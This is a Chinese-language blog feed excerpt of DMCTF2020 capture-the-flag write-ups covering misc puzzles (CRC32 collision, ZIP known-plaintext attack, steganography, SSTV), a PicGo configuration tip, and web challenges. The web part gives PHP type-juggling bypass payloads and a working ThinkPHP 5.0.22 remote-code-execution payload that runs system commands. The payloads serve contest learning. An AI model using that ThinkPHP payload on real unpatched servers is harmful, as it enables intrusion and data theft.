class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">... ....</span><br><span class="line">.. ...</span><br><span class="line">.. ...</span><br><span class="line">. .</span><br><span class="line">... ..</span><br><span class="line">. .</span><br><span class="line">..... .....</span><br><span class="line">.. ....</span><br><span class="line">... ...</span><br><span class="line">.. ..</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里我思索了好久，刚开始以为是摩斯密码，但是又对不上号，最后找到了一个名为敲击码的，正好一行中的<code>.</code>分成两部分代表坐标</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130111538.png"></p><p>解码得到：<code>ohhamazing</code> ，加上括号就是：<strong>flag{ohhamazing}</strong></p><p>事后多看了一眼图片命名：<code>Tap code.jpg</code>。这用啥解密不就在脸上写着的<del>wosabi \0/</del>。。。</p><h2 id="Collision"><a href="#Collision" class="headerlink" title="Collision"></a>Collision</h2><p>打开压缩包发现都是加密，但是原始大小都为4，只有CRC不一样：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201102424.png"></p><p>所以很有可能是四位数据的CRC32碰撞，就去网上找了一个python脚本：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45396639/article/details/103393759">crc32碰撞 ctf python</a>作者原创的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc</span>(<span class="params">_crc</span>):</span></span><br><span class="line">    l = <span class="number">1</span></span><br><span class="line">    dic = string.printable</span><br><span class="line">    _input = _crc</span><br><span class="line">    _input = <span class="string">&quot;0X&quot;</span> + _input</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> h <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + n + h + m</span><br><span class="line">                    s = s.encode()</span><br><span class="line">                    <span class="comment"># print(str(binascii.crc32(s)), _input)</span></span><br><span class="line">                    <span class="keyword">if</span> hex(binascii.crc32(s)).upper() == _input.upper():</span><br><span class="line">                        print(_crc, <span class="string">&#x27;:&#x27;</span>, s.decode())</span><br><span class="line">                        print(l)</span><br><span class="line">                        sys.exit()  <span class="comment">#直接退出，不进行接下来的碰撞了，一般在做题的时候，碰撞不会重复</span></span><br><span class="line">                    l = l + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc32</span>():</span></span><br><span class="line">    print(<span class="string">&quot;四字节碰撞!!!&quot;</span>)</span><br><span class="line">    num = int(input(<span class="string">&quot;你可能需要多个线程同时进行碰撞，请输入线程数：&quot;</span>))</span><br><span class="line">    _thread = []</span><br><span class="line">    _args = []</span><br><span class="line">    print(<span class="string">&quot;输入参数&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        print(i+<span class="number">1</span>, end=<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        _args.append(input())</span><br><span class="line">    <span class="comment"># print(_args)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        t = threading.Thread(target=crc, args=(_args[i],))</span><br><span class="line">        _thread.append(t) <span class="comment">#如果在这里开始线程会出一点小bug，虽然不要紧，但是不好看，不信的话你们自己试试</span></span><br><span class="line">    <span class="comment"># print(_thread)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        _thread[i].start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        _thread[i].join()</span><br><span class="line">    input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    crc32()</span><br></pre></td></tr></table></figure><p>使用python的多线程，因为是5个文件，开了5个线程，然后分别输入CRC码，压缩文件原来的CRC码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ff92876d</span><br><span class="line">6c4a558b</span><br><span class="line">77e8fd00</span><br><span class="line">1e59a66e</span><br><span class="line">d1f4eb9a</span><br></pre></td></tr></table></figure><p>碰撞以后获得的明文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1on&#125;</span><br><span class="line">32co</span><br><span class="line">llis</span><br><span class="line">flag</span><br><span class="line">&#123;crc</span><br></pre></td></tr></table></figure><p>根据flag的结构拼接一下：<strong>flag{crc32collis1on}</strong></p><h2 id="kaomoji"><a href="#kaomoji" class="headerlink" title="kaomoji"></a>kaomoji</h2><p>题目的压缩包解压以后得到一个<strong>flag.zip</strong>压缩包和<strong>secret.txt</strong>，flag.zip中也含有secret.txt，将外面没有加密的secret.txt使用<strong>winrar</strong>压缩（需要和原来的压缩软件一致哒）以后对比flag.zip里的文件发现CRC码相同的：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201103227.png"></p><p>配合ARCHPR使用明文攻击，获得加密密钥： <strong>[b00df998 5bdbbde6 485fa1f8]</strong></p><p>我在进行明文攻击时虽然没有跑出来压缩包的密码，但是获得了上面的密钥，也是可以解压加密的压缩包的（具体原理不清楚）。解压明文攻击解开获得的压缩包<strong>flag_decrypted.zip</strong>，打开flag.txt是颜文字表情加密，直接复制到浏览器console控制台运行获得flag：flag{kaomoj1_1s_cut3}</p><h2 id="ARCHPR"><a href="#ARCHPR" class="headerlink" title="ARCHPR"></a>ARCHPR</h2><p>题目根据提示：<strong>This file was encrypted by me with a four-digit password, try to crack it!</strong></p><p>密码只是用了4位数字加密，可以使用ARCHPR 进行爆破，获得一个flag.png和hint.txt，hint.txt如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The flag is hidden by a kind of magic called LSB. Try to find it if you can find it. The key is given to you. After decryption, change it to lowercase.</span><br><span class="line"></span><br><span class="line">key: .--. .- ... ... .-- --- .-. -..</span><br></pre></td></tr></table></figure><p>提示中提到了使用LSB隐写，密码是一段摩斯密码，摩斯密码解密后得到密文：<code>password</code>，使用LSB（<a target="_blank" rel="noopener" href="https://github.com/livz/cloacked-pixel">项目地址</a>）脚本执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lsb.py extract flag.png 1.txt password</span><br></pre></td></tr></table></figure><p><strong>1.txt</strong>中就包含了解密以后的flag：<strong>flag{th1s_15_f1agggggg}</strong></p><h2 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h2><p>​    看题目找工具，使用outguess参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43877387/article/details/103123858">隐写工具outguess 的下载安装及使用</a>，在kali中安装以后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -r flag.jpg hide.txt</span><br></pre></td></tr></table></figure><p>获得hide.txt文件的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Qb lbh xabj NRF? Gur xrl vf f3phe1gl, tb naq penpx vg!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Encrypted data: U2FsdGVkX1&#x2F;nmu9u2Ho1dD9kQWv7L5a6bsUrWxBkVp68txdFL4v&#x2F;givGGYy7dBU+</span><br></pre></td></tr></table></figure><p>上面一段使用<strong>凯撒密码</strong>移动13位获得：<strong>Do you know AES? The key is s3cur1ty, go and crack it!</strong></p><p>其实这里和别人讨论以后才知道他们使用的是叫ROT13，相应的还搜到了ROT5、ROT13、ROT18、ROT47，百度百科看了以后就是凯撒密码的变种。所以下面一段的密文使用AES进行解密，密码是<code>s3cur1ty</code>，获得flag：<strong>flag{y0u_ar3_awes0m3}</strong></p><p>解密网站：<a target="_blank" rel="noopener" href="https://tool.oschina.net/encrypt">https://tool.oschina.net/encrypt</a></p><h2 id="Whitespace"><a href="#Whitespace" class="headerlink" title="Whitespace"></a>Whitespace</h2><p>题目即提示，Whitespace进行一波搜索以后了解到是一种用空白符编程的语言，在压缩包里面摸了好久，在注释里发现空白编码：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201104847.png"></p><p>这也让我想到自己在网上下工具的压缩包时，网站经常在注释里附上密码，通常都是网站的网址。</p><p>在<a target="_blank" rel="noopener" href="https://vii5ard.github.io/whitespace">whitespace</a>网站中粘贴密文点上面的<code>run</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201105235.png"></p><p>解密获得：<strong>password is BlindWaterMark!</strong></p><p>输入解压以后获得两张看着相同的罗翔老师.png图片和一个hint.txt：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Do you see any difference between the two pictures?</span><br><span class="line">Get to know its secrets and tell you quietly that you need to know a knowledge called Manchester coding.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">上传文档</span><br><span class="line">你看这两幅画有什么不同吗？</span><br><span class="line">了解它的秘密，悄悄地告诉你，你需要知道一门叫做曼彻斯特编码的知识。</span><br></pre></td></tr></table></figure><p>根据提示找出图片的不同和曼切斯特编码。图片看着相同但是经过加密，在网上搜索了一波了解到了<strong>盲水印</strong>技术，使用盲水印解密图片，项目地址：<a target="_blank" rel="noopener" href="https://github.com/chishaxie/BlindWaterMark%EF%BC%8C%E6%89%A7%E8%A1%8C%EF%BC%9A">https://github.com/chishaxie/BlindWaterMark，执行：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python bwn.py decode 2.png 1.png 3.png </span><br></pre></td></tr></table></figure><p>获得解密图片：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201105728.png"></p><p>图片中的内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">296969a5695</span><br><span class="line">6696a6a9a69</span><br><span class="line">5669595a566</span><br><span class="line">965696666aa</span><br><span class="line">69596a9666a</span><br><span class="line">a6a6569955a</span><br><span class="line">5a66aa69a56</span><br><span class="line">9566a6a6aa6</span><br></pre></td></tr></table></figure><p>就百度曼切斯特编码解码，找到一篇博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30416871/article/details/98566881">一些CTF编码脚本</a>，在里面找到了这两段：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201105901.png"></p><p>心里一顿狂喜，因为都是<code>2965a</code>这个几个字符组成的，应该就是找对了。根据博客代码自行修改脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">s &#x3D; &#39;296969a56956696a6a9a695669595a566965696666aa69596a9666aa6a6569955a5a66aa69a569566a6a6aa6&#39;  #这是前面图片里的内容</span><br><span class="line"></span><br><span class="line">s&#x3D;bin(int(s,16))</span><br><span class="line">r&#x3D;&quot;&quot;</span><br><span class="line">for i in range(len(s)&#x2F;2):</span><br><span class="line">    if s[i*2:i*2+2] &#x3D;&#x3D; &#39;10&#39;:</span><br><span class="line">        r +&#x3D; &#39;1&#39;</span><br><span class="line">    else:</span><br><span class="line">        r +&#x3D; &#39;0&#39;</span><br><span class="line">print hex(int(r,2))[2:-1].decode(&#39;hex&#39;)</span><br></pre></td></tr></table></figure><p>执行脚本后获得flag：<strong>flag{ab1de_by_th3_law}</strong></p><h2 id="Steghide"><a href="#Steghide" class="headerlink" title="Steghide"></a>Steghide</h2><p>题目即工具。参考博客<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c3679f805a0c">隐写工具Steghide</a>，在kali中安装Steghide后执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide.exe extract -sf trump.jpg</span><br></pre></td></tr></table></figure><p>会提示<code>Enter passphrase:</code>直接回车表示空密码，获得flag.txt，打开以后里面都是由<code>¿ ¡ .</code>组成的密文，和<strong>Ook</strong>的另一种编码：<strong>short Ook</strong>类似也是只用<code>? ! .</code>组成，把叹号和问号全部替换反过来<code>¡---&gt;!  ¿---&gt;?</code>，替换之后在线解码：<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook%EF%BC%8C%E8%8E%B7%E5%BE%97flag%EF%BC%9A**flag%7By0u_ar3_clev3r%7D">https://www.splitbrain.org/services/ook，获得flag：**flag{y0u_ar3_clev3r}</a>**</p><h2 id="SSTV"><a href="#SSTV" class="headerlink" title="SSTV"></a>SSTV</h2><p>题目既是工具。搜索SSTV百度百科：</p><blockquote><p>慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。</p></blockquote><p>了解到是一种无线电传递图片的方法，搜到的博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/zkf0100007/article/details/83387790">慢扫描电视 SSTV</a>和B站的视频<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1ea4y1J787">慢扫描电视SSTV</a>，下载MMSSTV软件，把output.wav音频调制麦克风输出，我使用的方法是在声音设置里把立体声混音打开并且设为默认设备，然后电脑里播放的声音就会被录制到。等待图片绘制成功，获得flag：<strong>DMCTF{SSTV,yyds?}</strong></p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201111538.png"></p><h2 id="SimpleQrcode"><a href="#SimpleQrcode" class="headerlink" title="SimpleQrcode"></a>SimpleQrcode</h2><p>​    下载题目是一个gif图片都是二维码，使用使用stegSovle中的Frame Browser功能，一帧一帧播放，一帧一扫，有几帧图片是少了二维码的上边，有一张是少了右边，可以参考第一张完整的图片，把上面截取拼接上去，扫码后17张图片对应的内容（根据代码行号）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DM</span><br><span class="line">CT</span><br><span class="line">F&#123;</span><br><span class="line">Qr</span><br><span class="line">Co</span><br><span class="line">de</span><br><span class="line">_1</span><br><span class="line">s_</span><br><span class="line">so</span><br><span class="line">_i</span><br><span class="line">nt</span><br><span class="line">er</span><br><span class="line">es</span><br><span class="line">ti</span><br><span class="line">ng</span><br><span class="line">!!</span><br><span class="line">!&#125;</span><br></pre></td></tr></table></figure><p>参考下题目标题和flag格式，拼接后获得flag：<strong>DMCTF{QrCode_1s_so_interesting!!!}</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DMCTF2020 </tag>
            
            <tag> Misc </tag>
            
            <tag> 压缩包伪加密 </tag>
            
            <tag> 杂项编码 </tag>
            
            <tag> 图片隐写 </tag>
            
            <tag> CRC32碰撞 </tag>
            
            <tag> 明文攻击 </tag>
            
            <tag> SSTV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PicGo复制自定义链接</title>
      <link href="2020/PicGo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/"/>
      <url>2020/PicGo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>现在博客里面的图片使用的是github+jsdelivr+PicGo图床。PicGo是一个开源的上传图片的软件，支持大部分图床的上传，只需要设置对应的图床参数即可一键上传。github上PicGo的概述：</p><blockquote><p><strong>PicGo: 一个用于快速上传图片并获取图片 URL 链接的工具</strong></p><p>PicGo 本体支持如下图床：</p><ul><li><code>七牛图床</code> v1.0</li><li><code>腾讯云 COS v4\v5 版本</code> v1.1 &amp; v1.5.0</li><li><code>又拍云</code> v1.2.0</li><li><code>GitHub</code> v1.5.0</li><li><code>SM.MS V2</code> v2.3.0-beta.0</li><li><code>阿里云 OSS</code> v1.6.0</li><li><code>Imgur</code> v1.6.0</li></ul><p><strong>本体不再增加默认的图床支持。你可以自行开发第三方图床插件。</strong></p></blockquote><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/PicGo">PicGo</a></p><p>软件界面：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130095609.png"></p><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>PicGo上传成功以后可以自动复制url，但是默认复制的图片链接是github提供的，github在国内又经常抽风，图片通常都是无法访问的，所以我使用了jsdelivr提供的链接访问图片，PicGo也提供了自定义链接，但是规定必须包含<code>$url</code>参数，也就是默认的url地址：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130093835.png"></p><p>起初是把jsdelivr的链接直接拼在后面，每次使用的时候都再删一次。直到昨晚受不了了就尝试去修改软件试图绕过判断。</p><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>在软件设置的配置文件里找到了<code>customLink</code>，和之前自己设置的链接对照了一下，认为这个就是实际的自定义链接，直接在此处修改，再上传自动复制的链接就正确了，而且绕过了必须包含$url。<img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130094455.png"></p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130094651.png"></p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>软件提供了自动使用时间戳重命名，所以我自定义链接中还是使用了<code>$filename</code>变量，然后博客中的图片大部分都是使用QQ的截屏功能，出来的截图后缀都是<code>png</code>格式，这个可以根据需要自己设定拼接，然后使用的markdown编辑器是typora，想要添加图片直接<kbd>Crtl</kbd>+<kbd>Shift</kbd>+<kbd>i</kbd>，把图片链接贴里面就彳亍了。<span class='heimu'><del>白嫖真爽</del></span></p>]]></content>
      
      
      <categories>
          
          <category> 捣腾博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图床 </tag>
            
            <tag> PicGo上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DMCTF之Web</title>
      <link href="2020/DMCTF%E4%B9%8BWeb/"/>
      <url>2020/DMCTF%E4%B9%8BWeb/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>比赛地址：<a target="_blank" rel="noopener" href="http://dmctf.vaala.cloud:81/">http://dmctf.vaala.cloud:81</a></p><p>这次先写Web题目部分，我最后的排名：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130085338.png" alt="img"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="weak-type"><a href="#weak-type" class="headerlink" title="weak_type"></a>weak_type</h2><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&#39;class.php&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;level1 </span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;num&#39;]))&#123;</span><br><span class="line">    $num &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line">    if($num&#x3D;&#x3D;&#x3D;&quot;202020020&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)&#x3D;&#x3D;&#x3D;202020020)&#123;</span><br><span class="line">        echo &quot;&lt;br&gt; level 1 Ok &lt;br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&#39;what are you doing?&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;level 2</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;</span><br><span class="line">    $v1 &#x3D; $_GET[&#39;v1&#39;];</span><br><span class="line">    $v2 &#x3D; $_GET[&#39;v2&#39;];</span><br><span class="line">    if($v1 !&#x3D; $v2 &amp;&amp; md5($v1)&#x3D;&#x3D;md5($v2))&#123;</span><br><span class="line">        echo &quot;&lt;br&gt; level 2 Ok &lt;br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&#39;Are you kidding me ?&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;level 3 </span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;message&#39;])) &#123;</span><br><span class="line">    $message &#x3D; json_decode($_POST[&#39;message&#39;]);</span><br><span class="line">    if ($message-&gt;key &#x3D;&#x3D; $key) &#123;</span><br><span class="line">        echo &quot;&lt;br&gt; Wow you got it !!! &lt;br&gt;&quot;;</span><br><span class="line">        echo file_get_contents(&#39;&#x2F;flag&#39;);</span><br><span class="line">    &#125; </span><br><span class="line">    else &#123;</span><br><span class="line">        die(&quot;fail&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line">else&#123;</span><br><span class="line">     echo &quot;~~~~&quot;;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p> <strong>第一关</strong>利用intval()函数特性：直到遇上数字或正负符号才开始做转换。所以构造<code>num=202020020a</code>，即可。</p><blockquote><p>intval函数有个特性:”直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\0)结束转换”,在某些应用程序里由于对intval函数这个特性认识不够,错误的使用导致绕过一些安全判断导致安全漏洞</p></blockquote><p> <strong>第二关</strong>利用PHP处理哈希字符串时会把”0E”开头的哈希值解释为0，所以选择两个值在md5加密后是以0E开头即可。payload：<code>v1=QNKCDZO&amp;v2=240610708</code>，这篇博客中还进一步的讲解了一些<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_19980431/article/details/83018232">md5函数的漏洞</a>。</p><p> <strong>第三关</strong>进行<code>$message-&gt;key</code>和<code>$key</code>进行判断，<code>$key</code>之前没有声明过故值为空，所以传入的<code>message</code>也为空即可。post中传入<code>message=</code> 即可。</p><p><strong>完整payload</strong>：</p><p>url: <code>http://dmctf.vaala.cloud:28113/?num=202020020a&amp;v1=QNKCDZO&amp;v2=240610708</code></p><p>post: <code>message=</code></p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129202453.png" alt="img"></p><h2 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h2><p> 看到框架首先去搜索框架的漏洞，参考了[<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37865996/article/details/107468816">框架漏洞]Thinkphp系列漏洞【截至2020-07-20】</a></p><p> 这道题利用ThinkPHP5.0.22版本的漏洞可以执行远程代码。Thinkphp在实现框架中的核心类Request的method方法实现了表单请求伪装。但由于对<code>$_POST[‘_method’]</code>属性校验不严格，导致攻击者可以通过变量覆盖掉Request类的属性并结合框架特性实现对任意函数的调用，从而实现远程代码执行。</p><p>测试payload：</p><p><strong>url</strong>： <code>?s=captcha</code></p><p><strong>post</strong>： <code>_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></p><p>虽然报错但是最上方输出了<code>www-data</code></p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203051.png" alt="img"></p><p>根据题目中的提示<strong>flag在环境变量中</strong>，所以在网上查询linux系统输出环境变量的语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHELL</span><br><span class="line">env</span><br></pre></td></tr></table></figure><p>最终获取到flag的payload：</p><p>url： <code>?s=captcha</code></p><p>post： <code>_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=env</code></p><p>在输出末尾即是flag。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203818.png" alt="img"></p><h2 id="fungame"><a href="#fungame" class="headerlink" title="fungame"></a>fungame</h2><p> 打开是个游戏当然要玩一玩了在线地址：<a target="_blank" rel="noopener" href="https://justdui.github.io/%E3%80%82">https://justdui.github.io/。</a></p><p>我先下了源码到本地康一康，查看源码在<code>game.js</code>中第122行中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JAVASCRIPT</span><br><span class="line">nextLevel &#x3D; (nextLevel+1)%11;</span><br></pre></td></tr></table></figure><p> <code>nextlevel</code>根据变量名猜想是下一关的值，直接一个一个试，发现第10关入场动画不同，而且又一个大波斯，感觉就是最后一关，再将代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 